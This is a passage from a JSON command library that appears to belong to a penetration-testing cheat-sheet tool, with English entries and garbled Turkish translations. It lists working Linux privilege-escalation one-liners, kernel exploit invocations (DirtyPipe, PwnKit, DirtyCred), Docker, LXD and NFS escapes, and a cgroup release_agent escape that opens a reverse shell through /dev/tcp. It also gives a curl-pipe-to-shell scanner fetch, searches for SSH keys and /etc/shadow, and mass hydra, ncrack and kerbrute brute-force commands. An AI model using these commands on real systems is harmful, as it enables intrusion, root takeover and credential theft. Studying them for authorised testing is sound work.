            "desc_tr": "Bul: tüm binaries capabilities set ile"
          },
          {
            "title": "cap_setuid Python",
            "desc": "Escalate via python with cap_setuid",
            "cmd": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yetki yükselt: pythcap_setuid üzerinden ile üzerinde"
          },
          {
            "title": "cap_setuid Perl",
            "desc": "Escalate via perl with cap_setuid",
            "cmd": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Yetki yükselt: perl cap_setuid üzerinden ile"
          },
          {
            "title": "cap_dac_read_search",
            "desc": "Read any file on the system",
            "cmd": "# Binary with cap_dac_read_search can read any file\n# Example: tar with cap_dac_read_search\ntar czf /tmp/shadow.tar.gz /etc/shadow && tar xzf /tmp/shadow.tar.gz",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oku: any file the system üzerinde"
          },
          {
            "title": "cap_net_bind_service",
            "desc": "Bind to privileged ports (<1024)",
            "cmd": "# Binary with cap_net_bind_service can bind to any port\npython3 -c 'import socket;s=socket.socket();s.bind((\"0.0.0.0\",80));s.listen(1)'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bind privileged ports (<1024)'e"
          }
        ],
        "name_tr": "Linux Capabilities"
      },
      {
        "name": "Writable Files & PATH Hijack",
        "commands": [
          {
            "title": "Writable /etc/passwd",
            "desc": "Add root user to writable passwd file",
            "cmds": [
              "openssl passwd -1 newpassword",
              "echo 'root2:<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd",
              "su root2"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Ekle: root user writable passwd file'e"
          },
          {
            "title": "World-Writable Files",
            "desc": "Find world-writable files",
            "cmd": "find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: world-writable files"
          },
          {
            "title": "World-Writable Directories",
            "desc": "Find world-writable directories",
            "cmd": "find / -writable -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: world-writable directories"
          },
          {
            "title": "PATH Hijack via SUID Binary",
            "desc": "Hijack PATH for SUID binary using relative command path",
            "cmds": [
              "echo '#!/bin/bash\\n/bin/bash -p' > /tmp/service",
              "chmod +x /tmp/service",
              "export PATH=/tmp:$PATH",
              "<SUID_BINARY>"
            ],
            "tags": [
              "essential"
            ],
            "note": "Only works if SUID binary calls commands without absolute path",
            "desc_tr": "Hijack PATH for SUID binary relative command path kullanarak"
          },
          {
            "title": "Shared Library Hijack",
            "desc": "Find shared library misconfigurations",
            "cmds": [
              "# Find SUID binary and check libraries",
              "ldd <SUID_BINARY>",
              "# Check for writable library directories in search path",
              "strace <SUID_BINARY> 2>&1 | grep -i 'open.*\\.so'"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: shared library misconfigurations"
          }
        ],
        "name_tr": "Writable Files & PATH Hijack"
      },
      {
        "name": "Kernel Exploits",
        "commands": [
          {
            "title": "Linux Exploit Suggester",
            "desc": "Suggest kernel exploits based on kernel version",
            "cmd": "perl linux-exploit-suggester.pl",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Suggest kernel exploits based kernel version üzerinde"
          },
          {
            "title": "Linux Exploit Suggester 2",
            "desc": "Alternative exploit suggester (Python)",
            "cmd": "python linux-exploit-suggester-2.py",
            "tags": [
              "tool"
            ],
            "desc_tr": "Alternative istismar suggester (Python)"
          },
          {
            "title": "DirtyPipe (CVE-2022-0847)",
            "desc": "Kernel exploit for Linux 5.8-5.16.11",
            "cmd": "./dirtypipe /etc/passwd 1 '${root_entry}'",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel 5.8 through 5.16.11, 5.15.25, 5.10.102",
            "desc_tr": "Kernel istismar for Linux 5.8-5.16.11"
          },
          {
            "title": "DirtyCow (CVE-2016-5195)",
            "desc": "Kernel exploit for race condition in memory management",
            "cmd": "gcc -pthread dirty.c -o dirty -lcrypt && ./dirty newpassword",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel < 4.8.3",
            "desc_tr": "Kernel istismar for race conditimemory management üzerinde içinde"
          },
          {
            "title": "PwnKit (CVE-2021-4034)",
            "desc": "Polkit pkexec local privilege escalation",
            "cmd": "gcc pwnkit.c -o pwnkit && ./pwnkit",
            "tags": [
              "advanced"
            ],
            "note": "Affects most Linux distros with polkit installed (2009-2022)",
            "desc_tr": "Polkit pkexec yerel yetki yükseltme"
          },
          {
            "title": "Check Kernel Version for Exploits",
            "desc": "Quick kernel version identification",
            "cmd": "uname -r",
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı kernel versiidentification üzerinde"
          },
          {
            "title": "CVE-2022-2588 (DirtyCred)",
            "desc": "Kernel exploit using credential swapping",
            "cmd": "gcc dirtycred.c -o dirtycred && ./dirtycred",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel >= 5.8",
            "desc_tr": "Kernel istismar kimlik bilgileri swapping kullanarak"
          },
          {
            "title": "CVE-2023-0386 (OverlayFS)",
            "desc": "OverlayFS privilege escalation",
            "cmd": "gcc exploit.c -o exploit && ./exploit",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel < 6.2",
            "desc_tr": "OverlayFS yetki yükseltme"
          },
          {
            "title": "CVE-2023-32233 (Netfilter)",
            "desc": "Netfilter nf_tables use-after-free",
            "cmd": "gcc netfilter_exploit.c -o nf_exploit -lnftnl -lmnl && ./nf_exploit",
            "tags": [
              "advanced"
            ],
            "note": "Affects Linux kernel 5.1 to 6.3.1",
            "desc_tr": "Netfilter nf_tables use-after-free"
          },
          {
            "title": "Check Sudo Version for CVEs",
            "desc": "Check sudo version for known vulnerabilities",
            "cmd": "sudo --version",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: sudo versifor known zafiyet(ler) üzerinde"
          },
          {
            "title": "Check Polkit Version",
            "desc": "Check for PwnKit vulnerability",
            "cmd": "pkexec --version",
            "tags": [
              "essential"
            ],
            "note": "Versions before 0.120 are vulnerable to CVE-2021-4034",
            "desc_tr": "Kontrol et: for PwnKit zafiyet(ler)"
          },
          {
            "title": "PwnKit CVE-2021-4034",
            "desc": "pkexec local privesc",
            "cmds": [
              "ls -la /usr/bin/pkexec",
              "gcc pwnkit.c -o pwnkit && ./pwnkit"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "pkexec yerel privesc"
          },
          {
            "title": "Sudo CVE-2019-14287",
            "desc": "Bypass sudo user restriction",
            "cmd": "sudo -u#-1 /bin/bash",
            "tags": [
              "essential"
            ],
            "note": "Works on sudo < 1.8.28 with (ALL, !root) config",
            "desc_tr": "Atla: sudo user restriction"
          }
        ],
        "name_tr": "Kernel Exploits"
      },
      {
        "name": "Docker & Container Escape",
        "commands": [
          {
            "title": "Check Docker Group",
            "desc": "Check if current user is in docker group",
            "cmd": "id | grep -i docker",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if mevcut user is docker group içinde"
          },
          {
            "title": "Docker Group Escape (Mount Host)",
            "desc": "Mount host filesystem to escape container",
            "cmd": "docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağla: host filesystem escape container'e"
          },
          {
            "title": "Docker Socket Escape",
            "desc": "Escape via exposed Docker socket",
            "cmd": "docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs /bin/bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Escape açık Docker socket üzerinden"
          },
          {
            "title": "LXD Group Escape",
            "desc": "Exploit lxd group membership for root",
            "cmds": [
              "lxc image import alpine.tar.gz --alias alpine",
              "lxc init alpine privesc -c security.privileged=true",
              "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
              "lxc start privesc",
              "lxc exec privesc /bin/sh"
            ],
            "tags": [
              "essential"
            ],
            "note": "Need to upload alpine image to target first",
            "desc_tr": "İstismar et: r lxd grup üyelikleri for root"
          },
          {
            "title": "Check Container Environment",
            "desc": "Determine if running inside a container",
            "cmds": [
              "cat /proc/1/cgroup 2>/dev/null | grep -i docker",
              "ls -la /.dockerenv 2>/dev/null",
              "hostname"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Determine if running inside a container"
          },
          {
            "title": "Privileged Container Escape",
            "desc": "Escape from privileged Docker container",
            "cmds": [
              "mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape",
              "echo 1 > /tmp/escape/notify_on_release",
              "host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)",
              "echo \"$host_path/cmd\" > /tmp/escape/release_agent",
              "echo '#!/bin/bash' > /cmd",
              "echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /cmd",
              "chmod +x /cmd",
              "sh -c 'echo 0 > /tmp/escape/cgroup.procs'"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Escape privileged Docker container üzerinden"
          },
          {
            "title": "Docker Group Escape (Named Image)",
            "desc": "Escape via docker group with specific image",
            "cmd": "docker run -it --rm -v /:/mnt alpine chroot /mnt bash",
            "tags": [
              "essential"
            ],
            "desc_tr": "Escape docker group belirli image üzerinden ile"
          },
          {
            "title": "Docker Writable Socket Check",
            "desc": "Check if Docker socket is writable",
            "cmd": "ls -la /var/run/docker.sock",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if Docker socket is writable"
          },
          {
            "title": "LXD Group Escape (Quick)",
            "desc": "Quick LXD escape if already initialized",
            "cmds": [
              "lxc init ubuntu:20.04 privesc -c security.privileged=true",
              "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
              "lxc start privesc",
              "lxc exec privesc -- /bin/bash"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Hızlı LXD escape if already initialized"
          },
          {
            "title": "LXD Import Alpine Image",
            "desc": "Download and import Alpine image for LXD escape",
            "cmds": [
              "# On attacker: download alpine lxd image from https://github.com/saghul/lxd-alpine-builder",
              "# Transfer to target",
              "lxc image import alpine-v3.13-x86_64.tar.gz --alias alpine"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: and import Alpine image for LXD escape"
          },
          {
            "title": "Check Group Memberships",
            "desc": "Check if user belongs to docker, lxd, or disk groups",
            "cmd": "id | grep -oP '\\(docker\\)|\\(lxd\\)|\\(disk\\)|\\(adm\\)'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: if user belongs docker, lxd, or disk groups'e"
          },
          {
            "title": "Disk Group Abuse",
            "desc": "Read raw filesystem if in disk group",
            "cmd": "debugfs /dev/sda1 -R 'cat /etc/shadow'",
            "tags": [
              "advanced"
            ],
            "note": "Disk group allows raw access to block devices",
            "desc_tr": "Oku: raw filesystem if disk group içinde"
          },
          {
            "title": "ADM Group Log Access",
            "desc": "Read sensitive logs if in adm group",
            "cmd": "find /var/log -readable -type f 2>/dev/null | xargs grep -li 'password\\|pass\\|credential' 2>/dev/null",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oku: sensitive logs if adm group içinde"
          },
          {
            "title": "Docker Group Mount Host",
            "desc": "Escape via Docker group",
            "cmds": [
              "docker run -v /:/host -it alpine chroot /host /bin/bash",
              "docker run -v /etc/shadow:/shadow -it alpine cat /shadow"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Escape Docker group üzerinden"
          }
        ],
        "name_tr": "Docker & Container Escape"
      },
      {
        "name": "NFS Abuse",
        "commands": [
          {
            "title": "Check NFS Exports",
            "desc": "View NFS shares from remote",
            "cmd": "showmount -e <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "View NFS shares uzak üzerinden"
          },
          {
            "title": "Check no_root_squash",
            "desc": "Identify NFS shares with no_root_squash",
            "cmd": "cat /etc/exports",
            "tags": [
              "essential"
            ],
            "note": "no_root_squash allows root on client to be root on NFS share",
            "desc_tr": "Tespit et: NFS shares no_root_squash ile"
          },
          {
            "title": "Mount NFS Share",
            "desc": "Mount NFS share on attacker machine",
            "cmd": "mkdir /tmp/nfs && mount -t nfs <TARGET_IP>:/<SHARE> /tmp/nfs",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağla: NFS share attacker machine üzerinde"
          },
          {
            "title": "NFS SUID Shell Exploit",
            "desc": "Create SUID binary on NFS share as root",
            "cmds": [
              "# On attacker (as root) after mounting NFS share:",
              "cp /bin/bash /tmp/nfs/suid_bash",
              "chmod u+s /tmp/nfs/suid_bash",
              "# On target:",
              "/path/to/nfs/suid_bash -p"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: SUID binary NFS share as root üzerinde"
          }
        ],
        "name_tr": "NFS Abuse"
      },
      {
        "name": "Automated Scanners",
        "commands": [
          {
            "title": "LinPEAS",
            "desc": "Comprehensive Linux privilege escalation scanner",
            "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kapsamlı Linux yetki yükseltme tarayıcı"
          },
          {
            "title": "LinPEAS (Uploaded)",
            "desc": "Run LinPEAS after uploading to target",
            "cmd": "chmod +x linpeas.sh && ./linpeas.sh -a",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Çalıştır: LinPEAS uploading target'e sonra"
          },
          {
            "title": "LinEnum",
            "desc": "Linux enumeration and privilege escalation script",
            "cmd": "chmod +x LinEnum.sh && ./LinEnum.sh -t",
            "tags": [
              "tool"
            ],
            "desc_tr": "Linux listeleme and yetki yükseltme script"
          },
          {
            "title": "Pspy Process Monitor",
            "desc": "Monitor processes without root privileges",
            "cmd": "./pspy64",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Excellent for finding cron jobs and hidden processes",
            "desc_tr": "Monitor processes root privileges olmadan"
          },
          {
            "title": "Linux Smart Enumeration",
            "desc": "Smart Linux enumeration tool",
            "cmd": "chmod +x lse.sh && ./lse.sh -l 2",
            "tags": [
              "tool"
            ],
            "desc_tr": "Smart Linux listeleme tool"
          },
          {
            "title": "LinPEAS Specific Checks",
            "desc": "Run LinPEAS with specific check categories",
            "cmd": "./linpeas.sh -a -s -e",
            "tags": [
              "tool"
            ],
            "note": "-a=all, -s=superfast, -e=extra checks",
            "desc_tr": "Çalıştır: LinPEAS belirli check categories ile"
          },
          {
            "title": "LinPrivChecker",
            "desc": "Linux privilege checker script",
            "cmd": "python linprivchecker.py -w linprivchecker_output.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Linux privilege checker script"
          },
          {
            "title": "SUITECase Priv Checker",
            "desc": "Simple Unix privilege escalation checker",
            "cmd": "bash unix-privesc-check standard",
            "tags": [
              "tool"
            ],
            "desc_tr": "Basit Unix yetki yükseltme checker"
          },
          {
            "title": "GTFOBins Lookup",
            "desc": "Manual lookup for binary exploitation",
            "cmd": "# Visit https://gtfobins.github.io/ and search for the SUID/sudo binary",
            "tags": [
              "essential"
            ],
            "note": "Always check GTFOBins for any unusual SUID binary or sudo permission",
            "desc_tr": "Manual lookup for binary istismar"
          }
        ],
        "name_tr": "Automated Scanners"
      },
      {
        "name": "Interesting Files & Configs",
        "commands": [
          {
            "title": "Find History Files",
            "desc": "Search command histories",
            "cmd": "find / -name '.*history' -o -name '.*_history' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: command histories"
          },
          {
            "title": "SSH Keys Search",
            "desc": "Find SSH private keys",
            "cmd": "find / -name 'id_rsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: SSH private keys"
          },
          {
            "title": "Web App Configs",
            "desc": "Find configs with passwords",
            "cmds": [
              "find / -name 'wp-config.php' -o -name 'config.php' -o -name '.env' -o -name 'database.yml' -o -name 'settings.py' 2>/dev/null",
              "grep -rli 'password\\|passwd\\|db_pass\\|secret_key' /var/www/ /opt/ /srv/ 2>/dev/null"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: configs passwords ile"
          },
          {
            "title": "Find Database Files",
            "desc": "Search for DB files",
            "cmd": "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ara: for DB files"
          },
          {
            "title": "Find Backups",
            "desc": "Find backup files",
            "cmd": "find / -name '*.bak' -o -name '*.backup' -o -name '*.old' -o -name '*.orig' 2>/dev/null | head -30",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: backup files"
          },
          {
            "title": "Check /opt /srv",
            "desc": "Custom apps with creds",
            "cmd": "ls -laR /opt/ /srv/ 2>/dev/null | head -50",
            "tags": [
              "essential"
            ],
            "desc_tr": "özel apps creds ile"
          }
        ],
        "name_tr": "Interesting Files & Configs"
      }
    ],
    "name_tr": "Linux Yetki Yükseltme",
    "description_tr": "Escalate privileges on Linux systems through SUID binaries, sudo misconfigurations, capabilities, cron exploitation, kernel exploits, and container escapes."
  },
  {
    "id": "password-ops",
    "name": "Credential Attacks & Hash Cracking",
    "icon": "🔑",
    "description": "Perform online brute force, offline hash cracking, credential dumping, and password spraying to compromise authentication mechanisms.",
    "subcategories": [
      {
        "name": "Online Brute Force",
        "commands": [
          {
            "title": "Hydra SSH Brute Force",
            "desc": "Brute force SSH login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH login"
          },
          {
            "title": "Hydra FTP Brute Force",
            "desc": "Brute force FTP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı FTP login"
          },
          {
            "title": "Hydra HTTP POST Form",
            "desc": "Brute force web login form (POST)",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/login:username=^USER^&password=^PASS^:F=incorrect'",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "Adjust form fields and failure string to match target",
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı web logform (POST) içinde"
          },
          {
            "title": "Hydra HTTP GET Basic Auth",
            "desc": "Brute force HTTP Basic Authentication",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-get /protected/",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı HTTP Basic kimlik doğrulama"
          },
          {
            "title": "Hydra RDP Brute Force",
            "desc": "Brute force RDP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP login"
          },
          {
            "title": "Hydra SMB Brute Force",
            "desc": "Brute force SMB login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smb://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMB login"
          },
          {
            "title": "Hydra MySQL Brute Force",
            "desc": "Brute force MySQL login",
            "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL login"
          },
          {
            "title": "Hydra MSSQL Brute Force",
            "desc": "Brute force MSSQL login",
            "cmd": "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MSSQL login"
          },
          {
            "title": "Hydra POP3 Brute Force",
            "desc": "Brute force POP3 login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3 login"
          },
          {
            "title": "Hydra IMAP Brute Force",
            "desc": "Brute force IMAP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt imap://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IMAP login"
          },
          {
            "title": "Hydra SMTP Brute Force",
            "desc": "Brute force SMTP login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smtp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMTP login"
          },
          {
            "title": "Hydra VNC Brute Force",
            "desc": "Brute force VNC login",
            "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC login"
          },
          {
            "title": "Hydra Telnet Brute Force",
            "desc": "Brute force Telnet login",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt telnet://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı Telnet login"
          },
          {
            "title": "Hydra with User List",
            "desc": "Brute force with username and password lists",
            "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı username and password lists ile"
          },
          {
            "title": "Medusa SSH Brute Force",
            "desc": "Medusa parallel brute forcer for SSH",
            "cmd": "medusa -h <TARGET_IP> -u <USER> -P /usr/share/wordlists/rockyou.txt -M ssh",
            "tags": [
              "tool"
            ],
            "desc_tr": "Medusa parallel brute forcer for SSH"
          },
          {
            "title": "Ncrack RDP Brute Force",
            "desc": "Ncrack brute forcer for RDP",
            "cmd": "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ncrack brute forcer for RDP"
          },
          {
            "title": "Ncrack SSH Brute Force",
            "desc": "Ncrack brute forcer for SSH",
            "cmd": "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ncrack brute forcer for SSH"
          },
          {
            "title": "Ncrack FTP Brute Force",
            "desc": "Ncrack brute forcer for FTP",
            "cmd": "ncrack -vv --user <USER> -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Ncrack brute forcer for FTP"
          },
          {
            "title": "Hydra SNMP Community Brute",
            "desc": "Brute force SNMP community strings",
            "cmd": "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP> snmp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP community strings"
          },
          {
            "title": "Hydra HTTP POST JSON",
            "desc": "Brute force JSON API login endpoint",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form '/api/login:{\"username\":\"^USER^\",\"password\":\"^PASS^\"}:F=invalid:H=Content-Type: application/json'",
            "tags": [
              "advanced",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı JSAPI logendpoint üzerinde içinde"
          },
          {
            "title": "Hydra Multiple Targets",
            "desc": "Brute force across multiple targets",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -M targets.txt ssh -t 4",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı multiple targets genelinde"
          },
          {
            "title": "Patator SSH Brute Force",
            "desc": "Parallel brute force with patator",
            "cmd": "patator ssh_login host=<TARGET_IP> user=<USER> password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg='Authentication failed.'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Parallel kaba kuvvet saldırısı patator ile"
          },
          {
            "title": "Patator HTTP POST Brute Force",
            "desc": "Brute force web login with patator",
            "cmd": "patator http_fuzz url='http://<TARGET_IP>/login' method=POST body='user=^USER^&pass=FILE0' 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep='Invalid'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı web logpatator ile içinde"
          },
          {
            "title": "Crowbar RDP Brute Force",
            "desc": "Brute force RDP with crowbar",
            "cmd": "crowbar -b rdp -s <TARGET_IP>/32 -u <USER> -C /usr/share/wordlists/rockyou.txt",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP crowbar ile"
          },
          {
            "title": "Crowbar SSH Key Spray",
            "desc": "Spray SSH keys against a target",
            "cmd": "crowbar -b sshkey -s <TARGET_IP>/32 -u <USER> -k /path/to/keys/",
            "tags": [
              "tool"
            ],
            "desc_tr": "Püskürt: SSH keys a target'e karşı"
          },
          {
            "title": "Hydra MySQL",
            "desc": "Brute force MySQL",
            "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL"
          },
          {
            "title": "Hydra MSSQL",
            "desc": "Brute force MSSQL",
            "cmd": "hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MSSQL"
          },
          {
            "title": "Hydra VNC",
            "desc": "Brute force VNC",
            "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC"
          },
          {
            "title": "Hydra POP3",
            "desc": "Brute force POP3",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3"
          },
          {
            "title": "Hydra IMAP",
            "desc": "Brute force IMAP",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt imap://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı IMAP"
          },
          {
            "title": "Hydra SNMP",
            "desc": "Brute force SNMP",
            "cmd": "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP> snmp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SNMP"
          },
          {
            "title": "Hydra SSH with SecLists",
            "desc": "Brute force SSH using SecLists password file",
            "cmd": "hydra -l <USER> -P /usr/share/seclists/Passwords/passwords.txt ssh://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SSH SecLists password file kullanarak"
          },
          {
            "title": "Hydra SSH High Threads",
            "desc": "Fast SSH brute force with 64 parallel threads",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 64 ssh://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "note": "High thread count may cause connection drops on some targets",
            "desc_tr": "Hızlı SSH kaba kuvvet saldırısı 64 parallel threads ile"
          },
          {
            "title": "Hydra FTP Single Cred Test",
            "desc": "Test a single credential pair against FTP",
            "cmd": "hydra -l <USER> -p '<PASS>' ftp://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: a single kimlik bilgileri pair FTP'e karşı"
          },
          {
            "title": "CrackMapExec SSH Spray",
            "desc": "Spray credentials across subnet via SSH",
            "cmd": "crackmapexec ssh <SUBNET>/24 -u <USER> -p '<PASS>'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Püskürt: kimlik bilgileri subnet SSH üzerinden genelinde"
          },
          {
            "title": "CrackMapExec SSH User List",
            "desc": "Test multiple users with single password via SSH",
            "cmd": "crackmapexec ssh <TARGET_IP> -u users.txt -p '<PASS>' --continue-on-success",
            "tags": [
              "tool"
            ],
            "desc_tr": "Test et: multiple users single password SSH üzerinden ile"
          },
          {
            "title": "Kerbrute User Enum",
            "desc": "Enumerate AD users",
            "cmd": "kerbrute userenum --dc <DC_IP> -d <DOMAIN> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: AD users"
          },
          {
            "title": "Kerbrute Password Spray",
            "desc": "Spray password",
            "cmd": "kerbrute passwordspray --dc <DC_IP> -d <DOMAIN> users.txt '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Püskürt: password"
          }
        ],
        "name_tr": "Online Brute Force"
      },
      {
        "name": "Offline Cracking (Hashcat)",
        "commands": [
          {
            "title": "Hashcat MD5",
            "desc": "Crack MD5 hashes",
            "cmd": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: MD5 hashes"
          },
          {
            "title": "Hashcat SHA1",
            "desc": "Crack SHA1 hashes",
            "cmd": "hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kır: SHA1 hashes"
          },
          {
            "title": "Hashcat MD5Crypt",
            "desc": "Crack Linux MD5 crypt ($1$)",
